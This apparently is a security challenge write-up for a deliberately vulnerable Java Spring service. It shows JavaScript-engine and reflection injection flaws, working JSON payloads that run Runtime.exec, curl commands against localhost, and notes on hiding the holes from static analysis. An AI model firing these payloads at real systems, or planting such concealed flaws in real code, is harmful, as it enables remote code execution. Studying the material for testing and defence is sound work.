# Challenge 32 Vulnerability Demonstration

## Overview
The Java Spring application demonstrates multi-vector code execution vulnerabilities that are difficult for static analysis tools to detect.

## Key Vulnerabilities

### 1. JavaScript Engine Code Execution
**Location**: `evaluateExpression()` and `evaluateFormula()` methods
**Issue**: Uses ScriptEngine to evaluate user-controlled expressions

```java
javax.script.ScriptEngine engine = manager.getEngineByName("JavaScript");
engine.put("target", target);
return engine.eval(expression); // User-controlled expression executed
```

**Exploit Example**:
```json
{
  "operation": "transform",
  "data": {
    "expression": "java.lang.Runtime.getRuntime().exec('whoami')",
    "target": "test"
  }
}
```

### 2. Reflection-Based Class Instantiation
**Location**: `executeCustomOperation()` method
**Issue**: Dynamic class loading and method invocation based on user input

```java
String className = "com.custom.operations." + operation...
Class<?> operationClass = Class.forName(className);
```

**Exploit Example**:
```json
{
  "operation": "customOp",
  "data": {
    "className": "java.lang.Runtime", 
    "methodName": "getRuntime"
  }
}
```

### 3. Insufficient Validation Bypass
**Location**: `executeReflectionOperation()` method
**Issue**: Validation only checks class name prefix, allowing bypass

```java
if (!className.startsWith("java.lang") && !className.startsWith("java.util")) {
    throw new SecurityException("Unauthorized class access");
}
// But java.lang.Runtime is allowed!
```

## Why These Are Hard to Detect

1. **Legitimate Business Logic**: Expression evaluation appears to be a valid feature
2. **Layered Security**: Multiple validation layers make it appear secure
3. **Complex Flow**: Vulnerabilities span multiple methods and classes
4. **Context-Dependent**: Danger only emerges when all pieces combine
5. **Framework Integration**: Uses standard Spring patterns that look safe

## Impact
- Remote Code Execution
- System information disclosure  
- Arbitrary Java class instantiation
- Potential system compromise

## Demonstration Commands
(If application were running properly):

```bash
# Test basic functionality
curl -X POST http://localhost:8081/api/process \
  -H "Content-Type: application/json" \
  -d '{"operation": "format", "data": "hello"}'

# Exploit JavaScript engine RCE
curl -X POST http://localhost:8081/api/process \
  -H "Content-Type: application/json" \
  -d '{"operation": "transform", "data": {"expression": "java.lang.System.getProperty(\"user.name\")", "target": "test"}}'

# Exploit reflection vulnerability
curl -X POST http://localhost:8081/api/process \
  -H "Content-Type: application/json" \
  -d '{"operation": "calculate", "data": {"formula": "java.lang.Runtime.getRuntime().exec(\"id\")"}}'
```

The application demonstrates how sophisticated vulnerabilities can hide behind seemingly secure code patterns.
